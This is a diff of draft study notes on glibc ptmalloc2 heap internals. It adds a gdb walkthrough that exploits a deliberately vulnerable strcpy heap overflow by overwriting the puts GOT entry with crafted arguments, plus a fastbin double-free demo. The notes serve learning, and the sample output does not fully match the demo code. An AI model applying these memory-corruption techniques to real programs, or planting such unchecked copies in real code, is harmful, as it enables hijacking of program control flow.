@@ -94,10 +94,11 @@ While there is no single defacto heap allocator, most platforms congrete around 
 
 * `dlmalloc` Doug Lea's general purpose allocator, the original glibc (GNU/Linux) implementation.
 * `ptmalloc2` the present day (since 2006) multi-threaded allocator, the Doug Lea implmentation adapted to multiple threads/arenas by Wolfram Gloger.
+* `kalloc` XNU (X is Not UNIX) the kernel of Darwin used by macOS and iOS
 * `jemalloc` FreeBSD
 * `tcmalloc` Google
 * `libumem` Sun Solaris
-* 
+
 
 
 
@@ -117,8 +118,11 @@ Some properties of the `ptmalloc2` algorithm are:
 * In between, and for combinations of large and small requests, it does the best it can trying to meet both goals at once.
 * For very large requests (>= 128KB by default), it relies on system memory mapping (`mmap`) facilities, if supported.
 
-When a chunk is requested, the *first-fit algorithm* will try to find the first chunk that is both free and large enough. Or more concretely @how2heap shows how this deterministic behaviour can be used to control the data at a previously freed allocation:
 
+TODO: Include decision tree image of malloc implementation.
+
+
+When a chunk is requested, the *first-fit algorithm* will try to find the first chunk that is both free and large enough. Or more concretely @how2heap shows how this deterministic behaviour can be used to control the data at a previously freed allocation:
 
 ```c
 #include <stdio.h>
@@ -445,7 +449,57 @@ In heap management, a *bin* is just a list (linked list) of chunks of unallocate
 
 ### Fast bins
 
-Manages 10 separate bins, of sizes 16, 24, 32, 40, 48, 56, 64, 72, 80 and 88 bytes. Only free chunks that match the size (including metadata) of the bin can be added to it. For example, only a 48 byte free chunk can be added to the 48 byte fast bin.
+The fast bins manage 10 separate bins, as chains (singly linked lists) of free chunks. The 10 bins exist as follows:
+
+| Array index | Holds chunk sizes | Actual chunk size |
+| :---------: | :---------------: | :---------------: |
+| 0           | 00 - 12           | 16                |
+| 1           | 13 - 20           | 24                |
+| 2           | 21 - 28           | 32                |
+
+TODO: Complete this table from P10 https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf
+
+*Hold chunk sizes* shows the range of sizes that the bin is capable of holding, with *actual chunk size* being the real size after metadata and alignment of the chunk being freed. Only free chunks that match the size ranges (including metadata) of the bin can be added to it.
+
+Given that the free chunks are daisy chained together as a singly linked list, a side-effect of this is that all free chunk addition and removal operations occur at the head/front of the list (LIFO). That is, the last free chunk added to a list, will be the first one used for an allocation.
+
+
+                     0xdeadbeef
+                    +------------+------------+------------+------------+
+    fastbinsY +---> |            |            |            |            |
+                    | 0xdeadbeef |     0x0    | 0xdeadbeef | .......... |
+                    |            |            |            |            |
+                    +-----+------+------------+-----+------+------------+
+                          |                         |
+                          v                         v
+                    +-----+------+            +-----+------+
+                    |  unused    |            |  unused    |
+                    +------------+            +------------+
+                    |  size (16) |            |  size (16) |
+                    +------------+            +------------+
+                    |    bk      |            |    bk      |
+                    +------------+            +------------+
+                    | fd (NULL)  |            | fd 804b010 |
+                    +------------+            +-----+------+
+                                                    |
+                                                    v
+                                              +-----+------+
+                                              |  unused    |
+                                              +------------+
+                                              |  size (16) |
+                                              +------------+
+                                              |    bk      |
+                                              +------------+
+                                              | fd (NULL)  |
+                                              +------------+
+
+
+
+
+
+
+
+
 
 ```c
 typedef struct malloc_chunk *mfastbinptr;
@@ -476,14 +530,6 @@ Each bin (i.e. unsorted, small and large) is defined as two values, the head and
 
 
 
-Free chunk
-
-
-
-
-* Top chunk
-* Last remainder chunk
-
 
 
 
@@ -501,10 +547,7 @@ Free chunk
 
 # Common Vulnerabilities
 
-
-
-
-
+A given heap allocators has a broad attack surface. This surface is exponentially increased as multiple heap allocator implementations across languages and platforms is considered. There are many common heap allocators widely used out there, `ptmalloc2` being just one. Implementation differences aside do have some themes in common. 
 
 TODO: Summarise this ptmalloc security matrix https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks.html
 
@@ -512,9 +555,265 @@ TODO: Summarise this ptmalloc security matrix https://heap-exploitation.dhavalka
 
 
 
+## Heap overflow
+
+Given heap memory is mapped as a dedicated R/W segment, the overflow, not dissimilar to a buffer overflow, attempts to influence the control flow of a vulnerable program, by flooding the necessary pieces of heap memory.
+
+The following program has 4 `malloc()` calls, and `strcpy` overflow vulnerabilities on two of the allocations:
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/types.h>
+
+struct internet {
+  int priority;
+  char *name;
+};
+
+void winner()
+{
+  printf("and we have a winner @ %d\n", time(NULL));
+}
+
+int main(int argc, char **argv)
+{
+  struct internet *i1, *i2, *i3;
+
+  i1 = malloc(sizeof(struct internet));
+  i1->priority = 1;
+  i1->name = malloc(8);
+
+  i2 = malloc(sizeof(struct internet));
+  i2->priority = 2;
+  i2->name = malloc(8);
+
+  strcpy(i1->name, argv[1]);
+  strcpy(i2->name, argv[2]);
+
+  printf("and that's a wrap folks!\n");
+}
+```
+
+Running the program with two 4 byte inputs, runs as expected:
+
+    # ./heap1 AAAA BBBB
+    and that's a wrap folks!
+
+
+However with inputs that exceed the 8 byte allocated heap chunks:
+
+    gdb-peda$ r AAAABBBBCCCCDDDDEEEEFFFFGGGG 000011112222333344445555
+    Stopped reason: SIGSEGV
+    *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffffe66 "000011112222333344445555") at strcpy.c:40
+
+Segfaults. Noting the dest of the `strcpy` now has an address of `0x46464646` (or the FFFF characters from the first input argument). Given that we can control the destination address (offset of the FFFF characters), and source data by overflowing enough of the heap segment, have an *arbitary write to anywhere* vulnerability.
+
+A real world attack could involve mutating one of the GOT (global offset table) address for a function call to a dynamically linked piece of functionality tied in the linker (`ld.so`).
+
+
+    gdb-peda$ backtrace
+    #0  *__GI_strcpy (dest=0x46464646 <Address 0x46464646 out of bounds>, src=0xbffffe66 "000011112222333344445555") at strcpy.c:40
+    #1  0x080485ad in main (argc=0x3, argv=0xbffffd14) at main.c:30
+    #2  0xb7e8de46 in __libc_start_main (main=0x8048510 <main>, argc=0x3, ubp_av=0xbffffd14, init=0x80485d0 <__libc_csu_init>)
+    #3  0x08048421 in _start ()
+
+
+Disassembling the instruction responsible for calling `strcpy`:
+
+    gdb-peda$ disass 0x080485ad
+    Dump of assembler code for function main:
+    ...
+    0x080485a8 <+152>:   call   0x80483b0 <strcpy@plt>
+       0x080485ad <+157>:   mov    DWORD PTR [esp],0x804866b
+       0x080485b4 <+164>:   call   0x80483d0 <puts@plt>
+       0x080485b9 <+169>:   leave
+       0x080485ba <+170>:   ret
+    End of assembler dump.
+
+Reveals `puts@plt` is invoked after the dangerous `strcpy` call. To get to the GOT table, must first disassembly the PLT (procedure linkage table) trampoline to the GOT.
+
+    gdb-peda$ disassemble 0x80483d0
+    Dump of assembler code for function puts@plt:
+       0x080483d0 <+0>:     jmp    DWORD PTR ds:0x8049844
+       0x080483d6 <+6>:     push   0x20
+       0x080483db <+11>:    jmp    0x8048380
+    End of assembler dump.
+
+Bingo `DWORD PTR ds:0x8049844`, is the address of the `puts` GOT table entry. Replacing the 'FFFF' characters with the `puts` GOT table address `0x8049844`:
+
+    gdb-peda$ r "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x44\x98\x04\x08"`" 000011112222333344445555
+    Stopped reason: SIGSEGV
+    0x30303030 in ?? ()
+
+
+`0x30303030` happens to be the ASCII code for the `0` (zero) character, which are the first 4 bytes of the second input argument. The segfault `0x30303030 in ?? ()` highlights that the `puts` call, got rewired (its GOT entry) to invoke instruction `0x30303030`. Dumping the `EIP` confirms this:
+
+    gdb-peda$ info registers
+    eax            0x8049844        0x8049844
+    ecx            0x0      0x0
+    edx            0x19     0x19
+    ebx            0xb7fd5ff4       0xb7fd5ff4
+    esp            0xbffffc3c       0xbffffc3c
+    ebp            0xbffffc68       0xbffffc68
+    esi            0x0      0x0
+    edi            0x0      0x0
+    eip            0x30303030       0x30303030
+
+Placing the address of the desired instruction to be executed is now trivial, for example the `winner()` function:
+
+    gdb-peda$ x winner
+    0x80484ec <winner>:      "U\211\345\203\354\030\307\004$"
+
+Now to write the address of `winner()` into the EIP:
+
+    gdb-peda$ r "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x44\x98\x04\x08"`" "`/bin/echo -ne "\xec\x84\x04\x08"`"
+    and we have a winner @ 1570881614
+
+To gain a better intuition about what is going here. Set breakpoints after each `malloc` call. The first break is hit:
+
+    Breakpoint 1, 0x08048525 in main (argc=0x3, argv=0xbffffd24) at main.c:21
+    21        i1 = malloc(sizeof(struct internet));
+
+To visualise the heap segment further, need its segment address:
+
+    gdb-peda$ info proc mappings
+    process 2813
+    Mapped address spaces:
+    
+            Start Addr   End Addr       Size     Offset objfile
+             0x8048000  0x8049000     0x1000          0      /root/code/heap1/heap1
+             0x8049000  0x804a000     0x1000          0      /root/code/heap1/heap1
+             0x804a000  0x806b000    0x21000          0           [heap]
+            0xb7e76000 0xb7e77000     0x1000          0
+            0xb7e77000 0xb7fd3000   0x15c000          0      /lib/i386-linux-gnu/i686/cmov/libc-2.13.so
+
+Can see the heap is mapped between addresses `0x804a000` to `0x806b000`:
+
+    gdb-peda$ x/64wx 0x804a000
+    0x804a000:      0x00000000      0x00000011      0x00000000      0x00000000
+    0x804a010:      0x00000000      0x00020ff1      0x00000000      0x00000000
+    0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
+    0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
+    0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
+
+Here can see the first heap allocation  `0x00000000 0x00000011 0x00000000 0x00000000`, the first 8 bytes `0x00000000 0x00000011` being the chunk header, and the second 8 bytes `0x00000000 0x00000000` the user data (the uninitialised `internet struct` in this case).
+
+After the second `malloc()`:
+
+    gdb-peda$ x/64wx 0x804a000
+    0x804a000:      0x00000000      0x00000011      0x00000001      0x00000000
+    0x804a010:      0x00000000      0x00000011      0x00000000      0x00000000
+    0x804a020:      0x00000000      0x00020fe1      0x00000000      0x00000000
+    0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
+    0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
+
+gdb can intelligently parse raw heap memory back to the more human readable `internet struct`, by casting it to an assigned gdb variable like this:
+
+    gdb-peda$ set $i = (struct internet*)0x804a008
+    gdb-peda$ print *$i
+    $2 = {
+      priority = 0x1,
+      name = 0x0
+    }
+
+Now we can visualise the raw heap memory, let take a look at it straight after the dangerous `strcpy` is run with the malicious long input arguments:
+
+    gdb-peda$ x/64wx 0x804a000
+    0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+    0x804a010:      0x00000000      0x00000011      0x41414141      0x42424242
+    0x804a020:      0x43434343      0x44444444      0x45454545      0x08049844
+    0x804a030:      0x00000000      0x00000011      0x00000000      0x00000000
+    0x804a040:      0x00000000      0x00020fc1      0x00000000      0x00000000
+    0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
+
+
+This clearly shows the impact of the overflow. Note how the AAAA (0x41) BBBB (0x42) CCCC (0x43) DDDD (0x44) ... characters have overflowed the next chunk header bytes, and then even the value of the chunk data bytes aswell.
+
+While the first `malloc()` internet structure looks fine:
+
+    gdb-peda$ print *$i
+    $3 = {
+      priority = 0x1,
+      name = 0x804a018 "AAAABBBBCCCCDDDDEEEED\230\004\b"
+    }
+
+The second one has been damaged badly by the overflow:
+
+    gdb-peda$ set $i2 = (struct internet*)0x804a028
+    gdb-peda$ print *$i2
+    $5 = {
+      priority = 0x45454545,
+      name = 0x8049844 "փ\004\b\346\203\004\b`\335", <incomplete sequence \350\267>
+    }
+
+Given that i2->name points to the GOT entry for `puts` the `strcpy(i2->name, argv[2])` will write the second argument bytes on top of the GOT offset entry, giving ownership of control flow:
+
+    gdb-peda$ x $i2->name
+    0x8049844 <puts@got.plt>:       0x080483d6
+
+
+
+
+
+## Double free with fastbins
+
+Armed with an understanding of how the free list structures work, this particular example takes advantage of the fastbins implementation. Consider what would happen if a chunk that was previously allocated from a fastbin (e.g. the 16 byte fastbin) was freed multiple times. Given that `free()` blindly registers the no longer wanted chunk back to the fastbin, if freed multiple times, this same free chunk would end up having multiple registrations in the same fastbin, resulting in possible reallocation of the same chunk to different allocation requests.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+	int *a = malloc(8);
+	int *b = malloc(8);
+	int *c = malloc(8);
+
+	fprintf(stderr, "1st malloc(8): %p\n", a);
+	fprintf(stderr, "2nd malloc(8): %p\n", b);
+	fprintf(stderr, "3rd malloc(8): %p\n", c);
+
+	fprintf(stderr, "Freeing the first one...\n");
+	free(a);
+	fprintf(stderr, "So, instead, we'll free %p.\n", b);
+	free(b);
+	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
+	free(a);
+
+	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
+	fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
+	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
+	fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
+}
+```
+
+Outputs:
+
+    # ./fastbin_dup
+    1st malloc(8): 0x9214008
+    2nd malloc(8): 0x9214018
+    3rd malloc(8): 0x9214028
+    Freeing the first one...
+    If we free 0x9214008 again, things will crash because 0x9214008 is at the top of the free list.
+    So, instead, we'll free 0x9214018.
+    Now, we can free 0x9214008 again, since it's not the head of the free list.
+    Now the free list has [ 0x9214008, 0x9214018, 0x9214008 ]. If we malloc 3 times, we'll get 0x9214008 twice!
+    1st malloc(8): 0x9214008
+    2nd malloc(8): 0x9214018
+    3rd malloc(8): 0x9214008
+
+As expected, the chunk `0x9214008`, after being freed twice, was subsequently re-allocated twice.
+
+
 ## Heap location randomisation (ASLR)
 
-## 
+Huh, ASLR for heap?
+
+
+
 
 
 
